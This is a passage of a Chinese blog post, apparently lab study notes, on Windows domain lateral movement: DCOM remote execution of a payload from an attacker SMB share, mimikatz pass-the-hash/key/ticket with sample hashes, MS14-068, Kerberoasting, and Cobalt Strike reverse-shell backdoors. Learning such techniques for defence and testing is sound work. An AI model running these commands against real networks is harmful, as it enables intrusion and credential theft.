+                ></p>
+<p>—通过在sqlserver上获取的密码和用户账户，添加到Python脚本的字典里面，那么能够获取的域内用户的哈希密码越来越多</p>
+<p>—这里一般都获取到域内主机的本地用户的密码，我猜测通过这些哈希密码字典去爆破域控。因为即使获取到域内用户的正确密码，但是没有域管理员权限是无法通过mimikatz获取内存的密码。</p>
+<p>—但是即使如此，我们可以通过搜集域内用户的凭据信息来丰富明文和哈希字典</p>
+<h4 id="域横向COM和DCOM"><a href="#域横向COM和DCOM" class="headerlink" title="域横向COM和DCOM"></a>域横向COM和DCOM</h4><h6 id="1-COM"><a href="#1-COM" class="headerlink" title="1. COM"></a>1. COM</h6><p>com是微软的一套软件组件的二进制接口标准，使跨编程语言的进程间通信、动态对象创建成为可能</p>
+<h6 id="2-DCOM"><a href="#2-DCOM" class="headerlink" title="2. DCOM"></a>2. DCOM</h6><p>DCOM 是基于组件对象模型的一系列概念和程序接口，支持不同机器上的组件间的通信。利用DCOM，客户端程序能够请求来自网络中另一台计算机上的服务器程序对象</p>
+<h5 id="通过DCOM横向移动"><a href="#通过DCOM横向移动" class="headerlink" title="通过DCOM横向移动"></a>通过DCOM横向移动</h5><p>可以使用<code>Get-CimInstance win32_dcomapplication</code>这个命令列出计算机上所有的DCOM组件</p>
+<h6 id="1-MMC20-Application"><a href="#1-MMC20-Application" class="headerlink" title="1.MMC20.Application"></a>1.MMC20.Application</h6><p>利用MMC20.Application组件在远程主机上执行攻击荷载，并上线meterpreper</p>
+<ol>
+<li><p>在一台可控服务器上搭建smb匿名共享服务，并将生成发攻击荷载放入共享目录。</p>
+</li>
+<li><p>在管理员权限的powershell中执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过ProgID与DCOM进行远程交互，并创建MMC20.Application对象的实例</span><br><span class="line">$com=[activator]::createinstance([type]::GetTypeFromProID(&quot;MMC20.Application&quot;,&quot;10.10.10.19&quot;))</span><br><span class="line">调用ExecuteShellCommond方法启动进程，以运行攻击载荷</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommond(&#x27;cmd.exe&#x27;,$null,&quot;/c\\192.168.2.134\evilsmb&quot;)</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<p>2.ShellWindows</p>
+<h4 id="域横向PTH-amp-PTK-amp-PTT"><a href="#域横向PTH-amp-PTK-amp-PTT" class="headerlink" title="域横向PTH&amp;PTK&amp;PTT"></a>域横向PTH&amp;PTK&amp;PTT</h4><h6 id="PTH-利用LM或NTLM的值进行的渗透测试"><a href="#PTH-利用LM或NTLM的值进行的渗透测试" class="headerlink" title="PTH  利用LM或NTLM的值进行的渗透测试"></a>PTH  利用LM或NTLM的值进行的渗透测试</h6><p>PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash 和NTLM Hash访问远程主机或者服务，而不用提供明文密码</p>
+<p>如果禁用了NTLM认证，PsExec无法利用获得的NTLM Hash进行远程连接，但是使用mimlata还是可以攻击成功。对于8.1&#x2F;2012r2，安装补丁kb28719987发的win7&#x2F;2008r2&#x2F;8&#x2F;2012等，可以使用费AES keys代替NT hash来实现PTK攻击</p>
+<h6 id="PTT-利用票据凭证TGT进行的渗透测试"><a href="#PTT-利用票据凭证TGT进行的渗透测试" class="headerlink" title="PTT   利用票据凭证TGT进行的渗透测试"></a>PTT   利用票据凭证TGT进行的渗透测试</h6><p>可以理解为网站的cookie，就是一中和别人建立连接的凭据，利用这个凭据可以再次和别人建立连接</p>
+<p>ptt攻击不是简单的NTLM认证，同时利用kerberos协议进行攻击的</p>
+<p>攻击方式有ms14-068、黄金票据和白银票据</p>
+<p>ms14-068的危害是允许域内任何一个普通用户，，将自己提升至域管理权限。微软给处补丁kb3011780来修复</p>
+<h6 id="PTK-利用ekeys-aes256进行的渗透测试"><a href="#PTK-利用ekeys-aes256进行的渗透测试" class="headerlink" title="PTK   利用ekeys   aes256进行的渗透测试"></a>PTK   利用ekeys   aes256进行的渗透测试</h6><p>sekurlsa::ekeys得到aes256的值</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302151158779.png"
+                      alt="image-20230302151158779"
+                ></p>
+<h5 id="PTH传递-mimikatz"><a href="#PTH传递-mimikatz" class="headerlink" title="PTH传递-mimikatz"></a>PTH传递-mimikatz</h5><p>使用mimikatz获取密码等信息</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302150502637.png"
+                      alt="image-20230302150502637"
+                ></p>
+<p>在mimikatz里面使用   sekurlsa::pth（通过PTH连接） &#x2F;user（用户名）:administrator     &#x2F;domain（域名）:god       &#x2F;ntlm（哈希密码）:ccef208c6485269c20db2cad21734fe7</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302152334981.png"
+                      alt="image-20230302152334981"
+                ></p>
+<p>该命令是通过hash来连接到域控主机</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302152418333.png"
+                      alt="image-20230302152418333"
+                ></p>
+<p>即可得到控制权，然后就可以用at&amp;schtasks来进行后门的注入，如果权限不够就涉及提权了</p>
+<p>对于上面提到的微软打的补丁，没有打补丁的适用于这个方法，打了补丁只能administrator连接</p>
+<h5 id="利用哈希传递登入远程桌面"><a href="#利用哈希传递登入远程桌面" class="headerlink" title="利用哈希传递登入远程桌面"></a>利用哈希传递登入远程桌面</h5><p>条件：1.远程主机开启了“受限管理员”模式</p>
+<p>​            2.用户位于远程主机的管理员组中</p>
+<p>​            3.目标用户的哈希</p>
+<p>开启”受限管理员“模式,win8.1 win server 2012 R2默认开启</p>
+<p>手动开启<code>reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG-dword /d 00000000 /f</code></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查看是否开启“受限管理员模式”</span><br><span class="line">reg query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin</span><br><span class="line">0启动    1不启动</span><br><span class="line">如果开启就可以minikatz实现</span><br><span class="line">privilege::dubug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:hack-my.com /ntlm:用minikatz获取 “/run:mstsc.exe /restrictedadmin”</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:hack-my.com &#x2F;ntlm:38fe728ae616f0fde13715e7c320685f “&#x2F;run:mstsc.exe&#x2F;restrictedadmin”</p>
+<p>大致的原理是，哈希传递成功后执行“mstsc.exe&#x2F;restrictedadmin”</p>
+<p>受限管理员运行远程桌面客户端，不需要用户名密码即可登入进去</p>
+<h5 id="PTK传递-mimikatz"><a href="#PTK传递-mimikatz" class="headerlink" title="PTK传递-mimikatz"></a>PTK传递-mimikatz</h5><p>打补丁后工作组及域连接：必须打补丁后才能用户连接</p>
+<p>sekurlsa::ekeys  用来获取aes</p>
+<p>sekurlsa::pth  &#x2F;user:mary  &#x2F;domain:god &#x2F;aes256: d3444436d7b6c0b57a1cee8907d41fcbe35c3e46779eea77e6311c7df4aaa143</p>
+<p>打补丁和没打补丁中PTH和PTK的区别</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302160204415.png"
+                      alt="image-20230302160204415"
+                ></p>
+<h5 id="PTT传递-MS140-68-amp-kekoo-amp"><a href="#PTT传递-MS140-68-amp-kekoo-amp" class="headerlink" title="PTT传递-MS140-68&amp;kekoo&amp;"></a>PTT传递-MS140-68&amp;kekoo&amp;</h5><h6 id="MS14068：可以实现普通用户直接后去域控system权限"><a href="#MS14068：可以实现普通用户直接后去域控system权限" class="headerlink" title="MS14068：可以实现普通用户直接后去域控system权限"></a>MS14068：可以实现普通用户直接后去域控system权限</h6><p>执行过程：</p>
+<ol>
+<li>查看当前sid      whoami&#x2F;user</li>
+<li>mimikatz          kerberos::purge（清空当前主机中所有凭证，如果有域成员凭证会影响凭证伪造）</li>
+</ol>
+<p>​       mimikatz          kerberos::list         查看当前主机的凭证</p>
+<p>​       mimikatz          kerberos::ptc         将票据注入到内存中</p>
+<ol start="3">
+<li><p>利用ms14268生成TGT数据</p>
+<pre><code>ms14-068.exe -u 域成员名@域名 -s 当前域用户的sid -d 域控制器地址 -p 域成员密码
+</code></pre>
+</li>
+</ol>
+<p>.\MS14-068.exe -u <a class="link"   href="mailto:&#x6d;&#97;&#x72;&#121;&#64;&#103;&#x6f;&#x64;&#46;&#x6f;&#x72;&#103;" >&#x6d;&#97;&#x72;&#121;&#64;&#103;&#x6f;&#x64;&#46;&#x6f;&#x72;&#103; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45（注意前面要加.\）</p>
+<p>这里发现自动创建了个<a class="link"   href="mailto:&#x54;&#x47;&#x54;&#x5f;&#x6d;&#x61;&#114;&#x79;&#x40;&#x67;&#111;&#x64;&#x2e;&#x6f;&#x72;&#103;&#x2e;&#99;&#99;&#97;&#x63;&#104;&#101;" >&#x54;&#x47;&#x54;&#x5f;&#x6d;&#x61;&#114;&#x79;&#x40;&#x67;&#111;&#x64;&#x2e;&#x6f;&#x72;&#103;&#x2e;&#99;&#99;&#97;&#x63;&#104;&#101; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/c8272f46779d193ac1693410f196eb69b09225c7.png@831w_153h_progressive.webp"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/aa8ffd123435e20eca4bcffc13b199bf460c8d2d.png@831w_104h_progressive.webp"
+                      alt="img"
+                ></p>
+<ol start="4">
+<li>票据注入内存</li>
+</ol>
+<p>​       mimikatz.exe “kerberos::ptc <a class="link"   href="mailto:&#x54;&#71;&#x54;&#x5f;&#x6d;&#x61;&#x72;&#121;&#64;&#x67;&#111;&#x64;&#x2e;&#111;&#x72;&#103;&#x2e;&#x63;&#99;&#x61;&#x63;&#x68;&#x65;" >&#x54;&#71;&#x54;&#x5f;&#x6d;&#x61;&#x72;&#121;&#64;&#x67;&#111;&#x64;&#x2e;&#111;&#x72;&#103;&#x2e;&#x63;&#99;&#x61;&#x63;&#x68;&#x65; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ exit</p>
+<ol start="5">
+<li>然后就可以直接连接了    dir \主机名\c$</li>
+</ol>
+<h6 id="lodon工具"><a href="#lodon工具" class="headerlink" title="lodon工具"></a>lodon工具</h6><h4 id="域横向cobaltstrike-amp-RDP"><a href="#域横向cobaltstrike-amp-RDP" class="headerlink" title="域横向cobaltstrike&amp;RDP"></a>域横向cobaltstrike&amp;RDP</h4><p>除了IPC WMI SMB等连接方式外还可以使用RDP连接</p>
+<p>RDP协议连接：判断对方远程桌面服务是否开启（默认是：3389），端口扫描可以判断</p>
+<h6 id="RDP明文密码连接"><a href="#RDP明文密码连接" class="headerlink" title="RDP明文密码连接"></a>RDP明文密码连接</h6><p>win+r  运行mstsc</p>
+<p>输入域控主机IP地址，然后用户名，再用获取到的密码远程连接（鸡肋用不到，连不上，cao！）</p>
+<p>也可以使用命令行来连接</p>
+<p>—mstsc.exe &#x2F;console &#x2F;v:192.168.3.21 &#x2F;admin</p>
+<p>—对linux来说: rdesktop 192.168.3.21:3389 </p>
+<h6 id="RDP密文HASH链接"><a href="#RDP密文HASH链接" class="headerlink" title="RDP密文HASH链接"></a>RDP密文HASH链接</h6><p>—windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持</p>
+<p>—REG ADD “HKLM\System\CurrentControlSet\Control\Lsa” &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f </p>
+<p>然后运行mstsc.exe &#x2F;restrictedadmin</p>
+<h6 id="域横向移动SPN服务-探针-请求-导出-破解-重写"><a href="#域横向移动SPN服务-探针-请求-导出-破解-重写" class="headerlink" title="域横向移动SPN服务-探针-请求-导出-破解-重写"></a>域横向移动SPN服务-探针-请求-导出-破解-重写</h6><p>SPN：服务主体名称是kerberos客户端用于唯一标识给特定的kerberos目标计算机的服务实例名称（类似于token）</p>
+<p>Kerberos身份验证使用SPN将服务实例和服务的登入账户相关联，如果安装多个服务实例，每一个实例都需要有自己唯一的SPN</p>
+<h6 id="探针"><a href="#探针" class="headerlink" title="探针"></a>探针</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在获取的域内主机中cmd  输入  setspn -q */*  (扫描全部，这里每个域用户对应的SPN服务都有)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303134627617.png"
+                     
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">寻找特定sSPN服务   setspn -q */* |findstr“MSSQL”</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h6><p>先使用klist purge删除原有票据</p>
+<p>（power shell）     Add-Type -AssemblyName System.IdentityModel</p>
+<p>再使用这个</p>
+<p> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “MSSQLSvc&#x2F;fileserv.god.org:1433（服务名探针可找到）” </p>
+<h6 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h6><p>使用mimikatz导出</p>
+<p>kerberos::list &#x2F;export</p>
+<h6 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h6><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303140921568.png"
+                      alt="image-20230303140921568"
+                ></p>
+<p>破解工具tgsrepcrack.py破解服务票据（python3环境）</p>
+<p>—将以mssql开头的文件拖到本地Kerberos进行密码爆破</p>
+<p>—kerberoast下载（专门针对Kerberos协议，tgsrepcrack.py是其中一个脚本）：<a class="link"   target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast" >https://github.com/nidem/kerberoast <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
+<p>首先创建一个密码字典</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/4827547fb5b70b382c2f60dda7fc23006eeefe3b.png@366w_191h_progressive.webp"
+                      alt="img" style="zoom:150%;" 
+                >
+
+<p>然后使用爆破脚本tgsrepcrack.py（要先pip install pysn1）</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9500bea8926429dd8e55b5d56133649c3a17d190.png@831w_209h_progressive.webp"
+                      alt="img" style="zoom:150%;" 
+                >
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303140552385.png"
+                      alt="image-20230303140552385"
+                ></p>
+<p>得到密码</p>
+<h6 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h6><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303141012726.png"
+                      alt="image-20230303141012726"
+                ></p>
+<p>主要原理就是将得到的票据重写（伪造票据），然后将其通过mimikatz注入到内存中即可</p>
+<p>注入之后就可以连接靶机：</p>
+<p>dir &#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;c$(查看靶机c盘文件)</p>
+<h6 id="CobaltStrike工具使用"><a href="#CobaltStrike工具使用" class="headerlink" title="CobaltStrike工具使用"></a>CobaltStrike工具使用</h6><p>大概流程：启动-配置-监听-执行-上线-提权-信息收集-渗透</p>
+<p>在服务器中（外网环境）安装CobaltStrike并且提前配置Java环境</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java环境安装教程</span><br><span class="line">sudo apt install openjdk-11-jdk</span><br></pre></td></tr></table></figure></div>
+
+<p>启动服务端（服务器启动）</p>
+<p>.&#x2F;teamserve ‘本服务器IP’ ‘团队接入的口令可以随便写’</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/f5893e5a1ced0b278f9bf8219aeea5c3d45ec8fe.png@831w_96h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>服务器端需要root权限，要在云端服务器打开50050端口</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/b29af5915adc8765aef8736aeb3fc0ce1b12b702.png@513w_245h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>本地计算机启动<strong>CobaltStrike</strong>中的start.bat开启，并且配置在服务器上填写的ip和端口，user随便输</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/d3825132a2697f24040c20f46c1eae4eb289fddc.png@708w_215h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>这个工具与msf最大的区别就是支持多个人一同协作</p>
+<p>由于是多人协作所以要区分哪些资源是各自的，通过配置监听器来实现拥有各自的监听管道（后门传输管道）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e519023d26a41d147744dbad80057c812f062127.png@831w_468h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>监听器具有多种协议，常见的有：dns&#x2F;http&#x2F;smb&#x2F;c2</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/439e27ed691d00b293fd87de347187923edc72fa.png@453w_192h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>ip和端口就是shell要返回的地址（在这里只能是外网服务器）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/fcfb0947f8b466c569e7ffb5235cf4d8dd75fe86.png@702w_342h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>创建成功后，生成可执行文件（有不同的格式，选择windows64位的exe）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9f141d34e95c100ddb1669790fe7b8107235589c.png@429w_219h_progressive.webp"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/56937c29ac696ccbdce40aa6955b6e0cbcab644c.png@554w_255h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>将生成的的后门exe复制到域靶机中运行，就会反弹靶机的shell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/259a810e6ab3fa04238cdfaa1f0195f41152e7ab.png@831w_180h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>进入图形化界面右击鼠标选择interact，即可调出命令窗口</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/73f6087005ee9f00460eb30c35d23c2770a8c509.png@512w_167h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>输入shell ipconfig查看ip配置</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/f5be55a7b9ba803a584034c62568fb5b545d42fe.png@831w_291h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>在图形化界面进行提权操作（自带提权插件太少需要自己安装插件）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e68e4c13f949649acddba433fea1c8deec0795da.png@633w_263h_progressive.webp"
+                      alt="img"
+                ></p>
+<h6 id="关于提权及插件加载"><a href="#关于提权及插件加载" class="headerlink" title="关于提权及插件加载"></a>关于提权及插件加载</h6><p>以下使用的提权插件为：taowu-cobalt-strike 和Erebus</p>
+<p>点击加载插件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/86a402e6e9fc6a06e9383a92610ecc33d2d8a63c.png@831w_416h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>加载第三方提权模块，发现提权模块变多了，选择m14-508</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/1c08beee62ad0b7d58050752403fdb5409f3bfb1.png@551w_173h_progressive.webp"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/4e78a21c07c34979a5781061f2e26575425932c7.png@594w_254h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>！！！！m14-508漏洞描述</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e83ce667d677ebf25a26d314969df09f77edc755.png@831w_240h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>即可提升至system权限</p>
+<h6 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h6><p>在命令终端输入net view探活主机</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2971a9d0399b422bb43fa9f3fc97785758f767da.png@831w_177h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>点击view中targets将探针的主机显示出来</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/7e380d0b68d3ead9bf5b78b04b78c61e7ff9c77d.png@831w_299h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>也可以用批量代码执行</p>
+<p>— for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”</p>
+<p>提权成功之后就可以，导出hash值，利用mimikatz进行横向渗透，也可以上传后门工具进行进一步攻击。如Ladon啥的工具</p>
+<p>这个指令可以直接获得域控的地址net dclist</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230304135454384.png"
+                      alt="image-20230304135454384"
+                ></p>
+<p>CobaltStrike Aggressor 脚本合集（可以自行在GitHub搜索）：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/harleyQu1nn/AggressorScripts" >https://github.com/harleyQu1nn/AggressorScripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/Und3rf10w/Aggressor-scripts" >https://github.com/Und3rf10w/Aggressor-scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/001SPARTaN/aggressor_scripts" >https://github.com/001SPARTaN/aggressor_scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Aggressor-Script" >https://github.com/rasta-mouse/Aggressor-Script <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/threatexpress/aggressor-scripts" >https://github.com/threatexpress/aggressor-scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/ramen0x3f/AggressorScripts" >https://github.com/ramen0x3f/AggressorScripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/FortyNorthSecurity/AggressorAssessor" >https://github.com/FortyNorthSecurity/AggressorAssessor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/michalkoczwara/aggressor_scripts_collection" >https://github.com/michalkoczwara/aggressor_scripts_collection <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/ars3n11/Aggressor-Scripts" >https://github.com/ars3n11/Aggressor-Scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor" >https://github.com/gaudard/scripts/tree/master/red-team/aggressor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/bluscreenofjeff/AggressorScripts" >https://github.com/bluscreenofjeff/AggressorScripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/vysecurity/Aggressor-VYSEC" >https://github.com/vysecurity/Aggressor-VYSEC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit" >https://github.com/killswitch-GUI/CobaltStrike-ToolKit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/rsmudge/ElevateKit" >https://github.com/rsmudge/ElevateKit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> （第三方提权攻击）</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/CobaltStrike-Toolset" >https://github.com/QAX-A-Team/CobaltStrike-Toolset <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/DeEpinGh0st/Erebus" >https://github.com/DeEpinGh0st/Erebus <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> （Erebus CobaltStrike后渗透测试插件，持续更新）（本文选择的插件）</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/branthale/CobaltStrikeCNA" >https://github.com/branthale/CobaltStrikeCNA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/pandasec888/taowu-cobalt-strike%EF%BC%88%E6%9C%AC%E6%96%87%E9%80%89%E6%8B%A9%E7%9A%84%E6%8F%92%E4%BB%B6%EF%BC%89" >https://github.com/pandasec888/taowu-cobalt-strike（本文选择的插件） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h4 id="域横向内网漫游socks代理隧道技术"><a href="#域横向内网漫游socks代理隧道技术" class="headerlink" title="域横向内网漫游socks代理隧道技术"></a>域横向内网漫游socks代理隧道技术</h4><h6 id="内网：具有私有网段地址，如10-x2F-8，172-16-x2F-12，192-168-x2F-16等这些可称为内网网段"><a href="#内网：具有私有网段地址，如10-x2F-8，172-16-x2F-12，192-168-x2F-16等这些可称为内网网段" class="headerlink" title="内网：具有私有网段地址，如10&#x2F;8，172.16&#x2F;12，192.168&#x2F;16等这些可称为内网网段"></a>内网：具有私有网段地址，如10&#x2F;8，172.16&#x2F;12，192.168&#x2F;16等这些可称为内网网段</h6><h6 id="正向连接和反向连接"><a href="#正向连接和反向连接" class="headerlink" title="正向连接和反向连接"></a>正向连接和反向连接</h6><p>正向：控制端连接被控制端</p>
+<p>反向：被控制端去连接控制端</p>
+<p>在内网环境中是不能被外网主动发现连接的，所以这时候就需要通过内网主动反向的连接外网控制端</p>
+<h6 id="代理和隧道的区别"><a href="#代理和隧道的区别" class="headerlink" title="代理和隧道的区别"></a>代理和隧道的区别</h6><p>代理：主要是解决了网络的连通性问题，但是有些防火墙就会设置禁止代理的相关协议，这时候就需要隧道</p>
+<p>隧道：可以认为是代理的高级版，它利用了协议的伪装，可以解决流量分析和监控工具，和防火墙等一系列相关工具的过滤问题</p>
